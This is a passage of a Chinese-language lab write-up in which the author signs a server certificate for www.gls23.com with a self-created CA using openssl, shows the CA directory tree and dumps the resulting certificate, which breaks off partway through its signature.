class="hljs-keyword">in</span> server.csr -out server.crt -batch \</span><br><span class="bash">&gt; -cert ./ca.crt -keyfile ./ca.key</span><br>Using configuration from ./my_openssl.cnf<br>Enter pass phrase for ./ca.key:<br>Check that the request matches the signature<br>Signature ok<br>Certificate Details:<br>        Serial Number: 4096 (0x1000)<br>        Validity<br>            Not Before: Jun 22 14:34:08 2023 GMT<br>            Not After : Jun 19 14:34:08 2033 GMT<br>        Subject:<br>            countryName               = US<br>            organizationName          = gls23 Inc.<br>            commonName                = www.gls23.com<br>        X509v3 extensions:<br>            X509v3 Basic Constraints: <br>                CA:FALSE<br>            Netscape Comment: <br>                OpenSSL Generated Certificate<br>            X509v3 Subject Key Identifier: <br>                53:6B:EA:44:75:F5:0D:AE:C1:B7:01:67:E5:E5:0C:EF:42:0E:9F:57<br>            X509v3 Authority Key Identifier: <br>                keyid:85:43:B9:78:0E:00:2C:30:DB:49:AC:E4:00:03:EF:B3:E0:D8:AD:49<br><br>            X509v3 Subject Alternative Name: <br>                DNS:www.gls2023.com, DNS:www.gls2024.com<br>Certificate is to be certified until Jun 19 14:34:08 2033 GMT (3650 days)<br><br>Write out database with 1 new entries<br>Data Base Updated<br><br></code></pre></td></tr></table></figure><p>执行之后，文件出现了变化</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/CA$ tree .<br>.<br>├── ca.crt<br>├── ca.key<br>├── demoCA<br>│   ├── certs<br>│   ├── crl<br>│   ├── index.txt<br>│   ├── index.txt.attr<br>│   ├── index.txt.attr.old<br>│   ├── index.txt.old<br>│   ├── newcerts<br>│   │   ├── 1000.pem<br>│   │   └── 1001.pem<br>│   ├── serial<br>│   └── serial.old<br>├── my_openssl.cnf<br>├── server.crt<br>├── server.csr<br>└── server.key<br><br>4 directories, 14 files<br><br></code></pre></td></tr></table></figure><p>查看一下server.crt</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[06/22/23]</span>seed<span class="hljs-keyword">@VM</span>:~/CA$ openssl x509 -in server.crt -text -noout<br><span class="hljs-attribute">Certificate</span>:<br>    <span class="hljs-attribute">Data</span>:<br>        <span class="hljs-attribute">Version</span>: <span class="hljs-number">3</span> (<span class="hljs-number">0</span>x2)<br>        Serial <span class="hljs-attribute">Number</span>: <span class="hljs-number">4097</span> (<span class="hljs-number">0</span>x1001)<br>        Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>        <span class="hljs-attribute">Issuer</span>: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Validity<br>            <span class="hljs-keyword">Not</span> <span class="hljs-attribute">Before</span>: Jun <span class="hljs-number">22</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">43</span> <span class="hljs-number">2023</span> GMT<br>            <span class="hljs-keyword">Not</span> After : Jun <span class="hljs-number">19</span> <span class="hljs-number">14</span>:<span class="hljs-number">54</span>:<span class="hljs-number">43</span> <span class="hljs-number">2033</span> GMT<br>        <span class="hljs-attribute">Subject</span>: C = US, O = gls23 Inc., CN = www.gls23.com<br>        Subject Public Key <span class="hljs-attribute">Info</span>:<br>            Public Key <span class="hljs-attribute">Algorithm</span>: rsaEncryption<br>                RSA <span class="hljs-attribute">Public-Key</span>: (<span class="hljs-number">2048</span> bit)<br>                <span class="hljs-attribute">Modulus</span>:<br>                    <span class="hljs-number">00</span>:<span class="hljs-number">95</span>:<span class="hljs-number">72</span>:<span class="hljs-number">09</span>:<span class="hljs-number">22</span>:<span class="hljs-number">45</span>:<span class="hljs-number">48</span>:<span class="hljs-number">33</span>:<span class="hljs-number">58</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:a3:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-number">27</span>:d5:d8:<br>                    a0:e2:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">87</span>:<span class="hljs-number">86</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">10</span>:d7:<span class="hljs-number">40</span>:a2:<span class="hljs-number">94</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:c6:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<br>                    <span class="hljs-number">84</span>:<span class="hljs-attribute">ff</span>:e4:<span class="hljs-number">61</span>:<span class="hljs-number">10</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">fe</span>:f4:a9:<span class="hljs-number">90</span>:<span class="hljs-number">09</span>:c1:a1:d3:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<br>                    <span class="hljs-number">59</span>:<span class="hljs-number">10</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">eb</span>:e2:<span class="hljs-number">29</span>:<span class="hljs-number">9</span><span class="hljs-attribute">c</span>:<span class="hljs-number">04</span>:<span class="hljs-attribute">cc</span>:<span class="hljs-number">48</span>:<span class="hljs-number">17</span>:e4:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">06</span>:<br>                    b2:<span class="hljs-number">28</span>:d7:d3:f5:<span class="hljs-number">88</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">08</span>:<span class="hljs-attribute">ea</span>:c8:<span class="hljs-attribute">ad</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:e5:<span class="hljs-attribute">eb</span>:<span class="hljs-number">20</span>:<br>                    f5:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">33</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">36</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:c8:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-number">21</span>:<span class="hljs-number">10</span>:<span class="hljs-number">97</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">27</span>:<br>                    <span class="hljs-attribute">ea</span>:<span class="hljs-number">24</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">07</span>:f6:d9:<span class="hljs-number">90</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">bf</span>:b6:<span class="hljs-number">00</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:c9:<br>                    <span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-number">37</span>:<span class="hljs-number">58</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">30</span>:<span class="hljs-number">18</span>:b3:<span class="hljs-number">20</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">45</span>:<span class="hljs-number">01</span>:<span class="hljs-number">99</span>:<span class="hljs-number">78</span>:<span class="hljs-attribute">ce</span>:<br>                    <span class="hljs-number">81</span>:b8:<span class="hljs-number">56</span>:<span class="hljs-number">93</span>:<span class="hljs-number">29</span>:<span class="hljs-number">58</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ea</span>:e9:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:a7:<span class="hljs-attribute">cf</span>:d9:f4:<span class="hljs-attribute">dc</span>:<br>                    <span class="hljs-number">37</span>:<span class="hljs-number">58</span>:<span class="hljs-number">75</span>:<span class="hljs-number">34</span>:a6:a5:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:a5:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">64</span>:a0:<span class="hljs-number">70</span>:<span class="hljs-attribute">ca</span>:b7:<span class="hljs-number">24</span>:<br>                    <span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">50</span>:f9:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">64</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-number">30</span>:<span class="hljs-number">80</span>:<span class="hljs-number">89</span>:a1:<span class="hljs-attribute">dc</span>:<span class="hljs-attribute">fc</span>:<span class="hljs-number">72</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">24</span>:<br>                    <span class="hljs-number">49</span>:<span class="hljs-attribute">eb</span>:c8:b6:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:b4:e5:<span class="hljs-attribute">bd</span>:f5:<span class="hljs-number">45</span>:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:c4:a7:c3:e8:<br>                    b2:<span class="hljs-number">28</span>:c2:b4:e3:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">48</span>:<span class="hljs-number">75</span>:b3:<span class="hljs-number">81</span>:<span class="hljs-attribute">ab</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">d</span>:<br>                    <span class="hljs-number">43</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:d8:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-attribute">ee</span>:<span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">61</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:e7:<span class="hljs-number">76</span>:<span class="hljs-number">27</span>:<span class="hljs-number">31</span>:<span class="hljs-number">38</span>:<br>                    <span class="hljs-number">66</span>:<span class="hljs-number">47</span>:<span class="hljs-number">68</span>:<span class="hljs-number">85</span>:e7:b2:<span class="hljs-number">80</span>:<span class="hljs-attribute">fd</span>:e1:<span class="hljs-number">98</span>:<span class="hljs-number">36</span>:<span class="hljs-number">70</span>:<span class="hljs-number">12</span>:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ad</span>:<br>                    <span class="hljs-number">85</span>:<span class="hljs-number">00</span>:<span class="hljs-attribute">fc</span>:<span class="hljs-number">45</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">72</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e9:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:e6:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:b1:<span class="hljs-number">45</span>:<br>                    <span class="hljs-number">95</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-number">21</span>:<span class="hljs-number">14</span>:<span class="hljs-number">1</span><span class="hljs-attribute">b</span>:<span class="hljs-number">64</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:f8:<span class="hljs-number">87</span>:<span class="hljs-number">34</span>:<span class="hljs-number">28</span>:b1:<span class="hljs-number">91</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<br>                    <span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span>d<br>                <span class="hljs-attribute">Exponent</span>: <span class="hljs-number">65537</span> (<span class="hljs-number">0</span>x10001)<br>        X509v3 <span class="hljs-attribute">extensions</span>:<br>            X509v3 Basic <span class="hljs-attribute">Constraints</span>: <br>                <span class="hljs-attribute">CA</span>:FALSE<br>            Netscape <span class="hljs-attribute">Comment</span>: <br>                OpenSSL Generated Certificate<br>            X509v3 Subject Key <span class="hljs-attribute">Identifier</span>: <br>                <span class="hljs-number">53</span>:<span class="hljs-number">6</span><span class="hljs-attribute">B</span>:<span class="hljs-attribute">EA</span>:<span class="hljs-number">44</span>:<span class="hljs-number">75</span>:F5:<span class="hljs-number">0</span><span class="hljs-attribute">D</span>:<span class="hljs-attribute">AE</span>:C1:B7:<span class="hljs-number">01</span>:<span class="hljs-number">67</span>:E5:E5:<span class="hljs-number">0</span><span class="hljs-attribute">C</span>:<span class="hljs-attribute">EF</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span><span class="hljs-attribute">E</span>:<span class="hljs-number">9</span><span class="hljs-attribute">F</span>:<span class="hljs-number">57</span><br>            X509v3 Authority Key <span class="hljs-attribute">Identifier</span>: <br>                <span class="hljs-attribute">keyid</span>:<span class="hljs-number">85</span>:<span class="hljs-number">43</span>:B9:<span class="hljs-number">78</span>:<span class="hljs-number">0</span><span class="hljs-attribute">E</span>:<span class="hljs-number">00</span>:<span class="hljs-number">2</span><span class="hljs-attribute">C</span>:<span class="hljs-number">30</span>:<span class="hljs-attribute">DB</span>:<span class="hljs-number">49</span>:<span class="hljs-attribute">AC</span>:E4:<span class="hljs-number">00</span>:<span class="hljs-number">03</span>:<span class="hljs-attribute">EF</span>:B3:E0:D8:<span class="hljs-attribute">AD</span>:<span class="hljs-number">49</span><br><br>            X509v3 Subject Alternative <span class="hljs-attribute">Name</span>: <br>                <span class="hljs-attribute">DNS</span>:www.gls2023.com, <span class="hljs-attribute">DNS</span>:www.gls2024.com<br>    Signature <span class="hljs-attribute">Algorithm</span>: sha256WithRSAEncryption<br>         <span class="hljs-number">62</span>:b0:a6:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">15</span>:<span class="hljs-number">35</span>:b4:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">5</span><span class="hljs-attribute">f</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">18</span>:<span class="hljs-number">89</span>:d2:<span class="hljs-number">32</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">10</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">19</span>:<br>         <span class="hljs-number">85</span>:<span class="hljs-number">39</span>:c1:<span class="hljs-attribute">ca</span>:<span class="hljs-number">49</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:d4:f0:a6:<span class="hljs-number">85</span>:b9:<span class="hljs-attribute">ac</span>:<span class="hljs-number">0</span><span class="hljs-attribute">b</span>:<span class="hljs-number">7</span><span class="hljs-attribute">a</span>:<span class="hljs-number">8</span><span class="hljs-attribute">c</span>:<span class="hljs-number">11</span>:<span class="hljs-number">19</span>:<span class="hljs-number">66</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">1</span><span class="hljs-attribute">c</span>:<span class="hljs-number">86</span>:<span class="hljs-number">60</span>:e6:f5:<span class="hljs-attribute">ac</span>:<span class="hljs-number">70</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">ba</span>:f7:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:e1:<span class="hljs-number">65</span>:<span class="hljs-number">21</span>:<br>         <span class="hljs-number">31</span>:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">33</span>:<span class="hljs-number">74</span>:<span class="hljs-number">64</span>:<span class="hljs-number">16</span>:<span class="hljs-number">66</span>:<span class="hljs-number">9</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">02</span>:<span class="hljs-number">74</span>:<span class="hljs-attribute">cf</span>:e3:<span class="hljs-number">93</span>:<span class="hljs-attribute">af</span>:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">86</span>:<br>         <span class="hljs-number">05</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">84</span>:<span class="hljs-number">34</span>:<span class="hljs-number">7</span><span class="hljs-attribute">f</span>:<span class="hljs-number">73</span>:<span class="hljs-number">69</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:d1:<span class="hljs-attribute">be</span>:f3:f5:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<span class="hljs-number">8</span><span class="hljs-attribute">e</span>:e8:<span class="hljs-number">98</span>:<span class="hljs-attribute">bf</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<br>         <span class="hljs-number">5</span><span class="hljs-attribute">c</span>:<span class="hljs-number">55</span>:<span class="hljs-number">73</span>:<span class="hljs-number">33</span>:<span class="hljs-number">09</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span><span class="hljs-attribute">a</span>:<span class="hljs-number">41</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">58</span>:d3:<span class="hljs-number">59</span>:e1:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:e3:<span class="hljs-number">92</span>:<span class="hljs-number">96</span>:d4:<br>         <span class="hljs-number">1</span><span class="hljs-attribute">d</span>:d3:b3:<span class="hljs-number">39</span>:<span class="hljs-number">27</span>:<span class="hljs-number">50</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">06</span>:<span class="hljs-number">4</span><span class="hljs-attribute">b</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-number">68</span>:<span class="hljs-number">97</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:a0:<span class="hljs-attribute">fe</span>:<span class="hljs-number">05</span>:<span class="hljs-number">1</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:<br>         <span class="hljs-number">95</span>:<span class="hljs-number">95</span>:<span class="hljs-number">24</span>:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-number">70</span>:f2:<span class="hljs-number">69</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">0</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">eb</span>:b8:<span class="hljs-number">00</span>:a3:<span class="hljs-attribute">dc</span>:<span class="hljs-number">29</span>:<span class="hljs-number">43</span>:<span class="hljs-number">28</span>:<br>         <span class="hljs-number">51</span>:<span class="hljs-attribute">df</span>:f5:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:e6:<span class="hljs-number">89</span>:<span class="hljs-number">79</span>:<span class="hljs-number">2</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">50</span>:<span class="hljs-number">22</span>:b1:<span class="hljs-number">9</span><span class="hljs-attribute">e</span>:<span class="hljs-number">17</span>:<span class="hljs-number">09</span>:<span class="hljs-number">76</span>:<span class="hljs-number">75</span>:<span class="hljs-number">30</span>:<br>         c3:<span class="hljs-number">32</span>:<span class="hljs-number">10</span>:f0:<span class="hljs-number">73</span>:<span class="hljs-number">34</span>:<span class="hljs-number">22</span>:<span class="hljs-number">26</span>:<span class="hljs-number">13</span>:<span class="hljs-number">64</span>:<span class="hljs-number">47</span>:<span class="hljs-number">3</span><span class="hljs-attribute">b</span>:<span class="hljs-number">39</span>:<span class="hljs-attribute">ac</span>:c1:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">34</span>:<span class="hljs-attribute">ff</span>:<br>         <span class="hljs-number">61</span>:e8:f6:<span class="hljs-number">02</span>:<span class="hljs-attribute">bf</span>:<span class="hljs-number">15</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>:<span class="hljs-number">30</span>:<span class="hljs-number">95</span>:e2:<span class="hljs-number">71</span>:<span class="hljs-number">14</span>:f1:c8:<span class="hljs-attribute">be</span>:<span class="hljs-number">42</span>:b4:<br>         f3:<span class="hljs-number">83</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">52</span>:<span class="hljs-attribute">ce</span>:d4:c2:<span class="hljs-number">4</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ed</span>:<span class="hljs-attribute">bb</span>:<span class="hljs-attribute">cf</span>:<span class="hljs-number">91</span>:<span class="hljs-number">3</span><span class="hljs-attribute">f</span>:<span class="hljs-number">09</span>:<span class="hljs-number">30</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-number">68</span>:<br>         d4:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">37</span>:<span class="hljs-number">81</span>:c6:<span class="hljs-attribute">fb</span>:<span class="hljs-number">32</span>:<span class="hljs-attribute">ca</span>:<span class="hljs-attribute">fb</span>:<span class="hljs-number">2</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">78</span>:<span class="hljs-number">06</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:d7:a1:<br>         <span class="hljs-number">69</span>:a8:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:<span class="hljs-number">6</span><span class="hljs-attribute">b</span>:e3:<span class="hljs-number">14</span>:<span class="hljs-number">59</span>:<span class="hljs-attribute">df</span>:<span class="hljs-number">95</span>:<span class="hljs-number">99</span>:<span class="hljs-attribute">fc</span>:a5:<span class="hljs-number">12</span>:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">54</span>:d4:<span class="hljs-number">03</span>:d6:<br>         <span class="hljs-attribute">cf</span>:<span class="hljs-number">1</span><span class="hljs-attribute">f</span>:a0:e1:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">66</span>:<span class="hljs-attribute">cd</span>:<span class="hljs-number">03</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">78</span>:<span class="hljs-number">65</span>:<span class="hljs-number">60</span>:f7:<span class="hljs-number">55</span>:c9:<span class="hljs-number">79</span>:<span class="hljs-number">19</span>:<br>         <span class="hljs-attribute">fd</span>:d2:<span class="hljs-attribute">db</span>:<span class="hljs-number">45</span>:b6:c2:<span class="hljs-number">68</span>:f0:<span class="hljs-number">04</span>:<span class="hljs-number">80</span>:<span class="hljs-number">65</span>:f7:<span class="hljs-number">40</span>:<span class="hljs-number">87</span>:c3:<span class="hljs-attribute">dc</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">18</span>:<br>         <span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-number">82</span>:<span class="hljs-number">7</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">16</span>:e9:<span class="hljs-number">02</span>:c9:<span class="hljs-number">58</span>:<span class="hljs-number">7</span><span class="hljs-attribute">b</span>:b5:<span class="hljs-attribute">ed</span>:<span class="hljs-number">62</span>:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:d9:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<span class="hljs-number">3</span><span class="hljs-attribute">a</span>:<span class="hljs-attribute">ca</span>:<br>         e0:c4:b2:d4:a1:<span class="hljs-number">35</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ae</span>:<span class="hljs-number">9</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">be</span>:e6:<span class="hljs-attribute">dd</span>:<span class="hljs-attribute">fb</span>:a9:<span class="hljs-attribute">ac</span>:<span class="hljs-number">10</span>:<span class="hljs-attribute">db</span>:<br>         <span class="hljs-number">41</span>:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:e0:e8:<span class="hljs-number">6</span><span class="hljs-attribute">a</span>:<span class="hljs-number">32</span>:<span class="hljs-number">2</span><span class="hljs-attribute">b</span>:<span class="hljs-number">44</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:a5:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:c4:<span class="hljs-number">88</span>:<span class="hljs-number">6</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ce</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">93</span>:<br>         <span class="hljs-number">48</span>:<span class="hljs-attribute">de</span>:<span class="hljs-number">27</span>:<span class="hljs-number">21</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-attribute">df</span>:a7:<span class="hljs-number">19</span>:f2:<span class="hljs-number">01</span>:b7:d3:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span><span class="hljs-attribute">a</span>:<span class="hljs-number">24</span>:<span class="hljs-attribute">fd</span>:<span class="hljs-number">15</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<br>         <span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-number">07</span>:<span class="hljs-number">46</span>:<span class="hljs-number">05</span>:b4:<span class="hljs-number">4</span><span class="hljs-attribute">c</span>:b8:<span class="hljs-number">84</span>:<span class="hljs-number">25</span>:<span class="hljs-number">28</span>:<span class="hljs-attribute">bc</span>:<span class="hljs-number">55</span>:e6:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>:f4:<span class="hljs-number">3</span><span class="hljs-attribute">d</span>:<br>         <span class="hljs-number">36</span>:<span class="hljs-number">84</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">fe</span>:<span class="hljs-number">56</span>:<span class="hljs-number">61</span>:<span class="hljs-number">54</span>:<span class="hljs-number">7</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">47</span>:b9:<span class="hljs-number">57</span>:<span class="hljs-attribute">bd</span>:<span class="hljs-number">0</span><span class="hljs-attribute">f</span>:b9:d8:<span class="hljs-number">86</span>:<span class="hljs-number">82</span>:<br>         <span class="hljs-number">65</span>:<span class="hljs-number">70</span>:<span class="hljs-number">95</span>:<span class="hljs-number">6</span><span class="hljs-attribute">e</span>:<span class="hljs-number">38</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">98</span>:<span class="hljs-number">17</span>:c6:<span class="hljs-number">01</span>:<span class="hljs-attribute">ac</span>:a0:<span class="hljs-number">4</span><span class="hljs-attribute">a</span>:<span class="hljs-number">01</span>:<span class="hljs-number">5</span><span class="hljs-attribute">d</span>:a8:<span class="hljs-number">82</span>:<span class="hljs-number">92</span>:<br>         <span class="hljs-attribute">ca</span>:<span class="hljs-number">38</span>:<span class="hljs-number">00</span>:<span class="hljs-number">54</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">38</span>:<span class="hljs-number">1</span><span class="hljs-attribute">e</span>:<span class="hljs-number">1</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span>:c5:<span class="hljs-number">59</span>:<span class="hljs-number">7</span><span class="hljs-attribute">e</span>:<span class="hljs-attribute">ff</span>:<span class="hljs-number">39</span>:<span class="hljs-number">04</span>:<span class="hljs-number">2</span><span class="hljs-attribute">f</span>:<br>         <span 